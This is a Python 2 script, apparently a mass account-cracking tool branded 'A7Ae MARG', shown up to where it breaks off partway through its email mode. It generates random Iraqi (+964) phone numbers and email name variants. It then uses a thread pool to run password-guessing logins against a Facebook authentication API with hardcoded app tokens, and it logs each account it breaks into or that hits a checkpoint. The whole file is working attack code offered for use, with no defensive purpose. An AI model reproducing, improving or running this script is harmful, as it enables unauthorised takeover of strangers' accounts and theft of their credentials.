import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(7000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

os.system('rm -rf ..txt')
for n in range(5000):
    nmbr = random.randint(11, 999)
    sys.stdout = open('..txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install tqdm')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 main.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.headhead = {
    'accept':'*/*',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8',
    'content-length':'270',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'ig_cb=1; ig_did=BF4465A9-017D-4668-B5C3-EBD3DA65B2A6; csrftoken=b8kQhInVzG8P5hvZwlxD38EjOrMfqxkC; rur=ASH; mid=XzHZAQALAAEagshAZoRCgkUeXmJP',
    'sec-fetch-dest':'empty',
    'sec-fetch-mode':'cors',
    'sec-fetch-site':'same-origin',
    'user-agent':'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36',
    'x-csrftoken':'b8kQhInVzG8P5hvZwlxD38EjOrMfqxkC',
    'x-ig-app-id':'936619743392459',
    'x-ig-www-claim':'0',
    'x-instagram-ajax':'a9aec8fa634f',
    'x-requested-with':'XMLHttpRequest'}
br.headhead = [('User-Agent', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996','Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36')]
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2','Mozilla/5.0 (Macintosh; U; Mac OS X 10_5_7; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5','Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13','Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.0 Safari/532.2','Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.224.2 Safari/532.3')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]


def mengetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def keluar():
    print 'Keluar'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)



def load():
    with tqdm(total=100, desc='Loading ', bar_format='{l_bar}{bar}') as (pbar):
        for i in range(100):
            time.sleep(0.03)
            pbar.update(1)

logo ="""
\033[1;97m    |     ____      |                '||    ||'     |     '||''|.    ..|'''.|  
\033[1;97m   |||    `  ||    |||      ....      |||  |||     |||     ||   ||  .|'     '  
\033[1;97m  |  ||      /,   |  ||   .|...||     |'|..'||    |  ||    ||''|'   ||    .... 
\033[1;97m .''''|.    //   .''''|.  ||          | '|' ||   .''''|.   ||   |.  '|.    ||  
\033[1;97m.|.  .||.  ((   .|.  .||.  '|...'    .|. | .||. .|.  .||. .||.  '|'  ''|...'|  
\033[1;97m           ||                                                                  
\033[1;97m           |' 

\033[1;97mMy Telegram : \033[1;97m@A7Ae_MARG

\033[1;97mMy Chanell : \033[1;97m@A7AeMARG
    """                                                                                                                                   
back = 0
berhasil = []
cekpoint = []
oks = []
okb = []
id = []
cpb = []
cps = []

def menu():
    os.system('clear')
    print logo
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m1\x1b[1;97m]\x1b[1;97m CRACK NUMBERS'
    print '\x1b[1;97m[\x1b[1;97m2\x1b[1;97m]\x1b[1;97m CRACK FACEBOOK'
    print '\x1b[1;97m[\x1b[1;97m3\x1b[1;97m]\x1b[1;97m USER CHECKER'
    print '\x1b[1;97m[\x1b[1;97m4\x1b[1;97m]\x1b[1;97m CRACK email'
    print '\x1b[1;97m[\x1b[1;97m0\x1b[1;97m]\x1b[1;97m Exit this program'
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'
    pilih_menu()


def pilih_menu():
    unikers = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97m( \x1b[1;97mChoose\x1b[1;97m ) > \x1b[97m')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Wrong input !'
        pilih_menu()
    elif unikers == '1' or unikers == '1':
        crack_nomor()
    elif unikers == '2' or unikers == '2':
        os.system('python2 .fb.py')
    elif unikers == '3' or unikers == '3':
        os.system('python2 .user.py')
    elif unikers == '4' or unikers == '4':
        crack_email()
    elif unikers == '0' or unikers == '0':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;97m\xc3\xb7\x1b[1;97m] Wrong input !'
        pilih_menu()


def crack_nomor():
    os.system('clear')
    print logo
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m1\x1b[1;97m]\x1b[1;97m CRACK NUMBERS KURDSTAN '
    print '\x1b[1;97m[\x1b[1;97m2\x1b[1;97m]\x1b[1;97m CRACK NUMBERS PASWORDS '
    print '\x1b[1;97m[\x1b[1;97m3\x1b[1;97m]\x1b[1;97m CRACK NUMBERS Free Mod   ' 
    print '\x1b[1;97m[\x1b[1;71m0\x1b[1;97m]\x1b[1;97m Back To Menu          '
    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~' 
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97m( \x1b[1;97mChoose\x1b[1;97m ) > \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;97mx\x1b[1;97m]\x1b[1;97m Wrong input !'
        pilih()
    elif unikers == '1' or unikers == '1':
        india()
    elif unikers == '2' or unikers == '2':
        nguyen()
    elif unikers == '3' or unikers == '3':
        a7a()
    elif unikers == '4' or unikers == '4':
        crack_email()
    elif unikers == '0' or unikers == '0':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;97m\xc3\xb7\x1b[1;97m] Wrong input !'
        pilih()


def india():
    os.system('clear')
    print logo
    print '\x1b[1;97m750-751'
    print '\x1b[1;97m780-781-782-783'
    print '\x1b[1;97m777-770-771-772-773'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;97m')
        exit('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Kode Wajib 3 Digit !!') if len(c) < 3 else ''
        k = '+964'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;97m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;92m[\x1b[1;92m!\x1b[1;92m] \x1b[1;92mDon't close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;92m[\x1b[1;92m\xe2\x80\xa2\x1b[1;92m]\x1b[1;92m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass1
                okb = open('save/india.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass1
                cps = open('save/india.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '1122334455'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass2
                    okb = open('save/india.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass2
                cps = open('save/india.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')                        
                cps.close()
                cekpoint.append(user + pass2)         
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack done ....'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;97mOK\x1b[1;97m/\x1b[1;97mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/kurd.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;97m BACK \x1b[1;97m]')
    os.system('python2 un.py')


def a7a():
    os.system('clear')
    print logo
    print '\x1b[1;97m  Crack Number Free Mod'
    print '\x1b[1;97m750-751'
    print '\x1b[1;97m780-781-782-783'
    print '\x1b[1;97m777-770-771-772-773'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;97m')
        exit('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Kode Wajib 3 Digit !!') if len(c) < 3 else ''
        k = '+964'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;97m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;92m[\x1b[1;92m!\x1b[1;92m] \x1b[1;92mDon't close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;92m[\x1b[1;92m\xe2\x80\xa2\x1b[1;92m]\x1b[1;92m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass1
                okb = open('save/india.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'mbasic.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass1
                cps = open('save/india.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '1122334455'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass2
                    okb = open('save/india.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'mbasic.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass2
                    cps = open('save/india.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)         
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack done ....'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;97mOK\x1b[1;97m/\x1b[1;97mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/kurd1.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;97m BACK \x1b[1;97m]')
    os.system('python2 un.py')

def nguyen():
    os.system('clear')
    print logo
    print '\x1b[1;97m750-751'
    print '\x1b[1;97m780-781-782-783'
    print '\x1b[1;97m777-770-771-772-773'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;97m ')
        exit('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Kode Wajib 3 Digit !!') if len(c) < 3 else ''
        k = '+964'
        print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97m Example : \x1b[1;91m ( A7Ae MARG) '
        pass1 = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] Password 1 : \x1b[97m')
        pass2 = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mPassword 2 : \x1b[97m')
        pass3 = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] Password 3 : \x1b[97m')
        pass4 = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mPassword 4 : \x1b[97m')
        pass5 = raw_input('\x1b[1;97m[\x1b[97m\xe2\x80\xa2\x1b[1;97m] Password 5 : \x1b[97m')
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;97m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mDon't Close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass1
                okb = open('save/nguyen.txt', 'a')
                okb.write('[HACK] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass1
                cps = open('save/nguyen.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass2
                    okb = open('save/nguyen.txt', 'a')
                    okb.write('[HACK] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass2
                    cps = open('save/nguyen.txt', 'a')
                    cps.write('[CHECK] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass3
                        okb = open('save/nguyen.txt', 'a')
                        okb.write('[HACK] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass3
                        cps = open('save/nguyen.txt', 'a')
                        cps.write('[CHECK]' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass4
                            okb = open('save/nguyen.txt', 'a')
                            okb.write('[HACK]' + k + c + user + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass4
                            cps = open('save/nguyen.txt', 'a')
                            cps.write('[CHECK' + k + c + user + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + k + c + user + ' \x1b[1;92m ' + pass5
                                okb = open('save/nguyen.txt', 'a')
                                okb.write('[HACK]' + k + c + user + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + k + c + user + ' \x1b[1;97m ' + pass5
                                cps = open('save/nguyen.txt', 'a')
                                cps.write('[CHECK]' + k + c + user + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Done ....'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;97mOK\x1b[1;97m/\x1b[1;97mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/kurd3.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;97m BACK \x1b[1;97m]')
    os.system('python2 un.py')


def crack_email():
    os.system('clear')
    print logo
    try:
        print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Example\x1b[1;97m :\x1b[1;97m putri.ayu '
        c = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Nama Target\x1b[1;97m :\x1b[1;97m ')
        print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Example \x1b[1;97m: \x1b[1;97m@hotmail.com'
        k = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Domain Email\x1b[1;97m :\x1b[1;97m ')
        print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Example \x1b[1;97m: \x1b[1;97mPutri123'
        pass1 = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password1\x1b[1;97m :\x1b[1;97m ')
        pass2 = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password2\x1b[1;97m :\x1b[1;97m ')
        pass3 = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password3\x1b[1;97m :\x1b[1;97m ')
        pass4 = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password4\x1b[1;97m :\x1b[1;97m ')
        pass5 = raw_input('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password5\x1b[1;97m :\x1b[1;97m ')
        idlist = '..txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))    
    jalan('\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Email \x1b[1;97m:\x1b[1;97m ' + xxx)
    time.sleep(1)
    jalan("\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mDon't Close")
    time.sleep(1)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + c + user + k + ' \x1b[1;92m ' + pass1
                okb = open('save/email.txt', 'a')
                okb.write('[Berhasil] ' + c + user + k + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
